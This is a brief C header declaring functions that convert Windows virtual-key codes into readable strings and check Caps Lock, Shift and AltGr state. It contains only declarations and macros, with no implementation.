#ifndef KEY_H
#define KEY_H

#define KEY_SIZE 50
#define UK "[UNKNOW]"

char *translate_key(DWORD vkCode);

char *n_pad(DWORD vkCode);
char *normal_letters(DWORD vkCode);
char *f_key(DWORD vkCode);
char *other(DWORD vkCode);
char *number(DWORD vkCode);

const int isCapsLock(void);
const int isAltgrLock(void);
const int isShiftLock(void);

#endif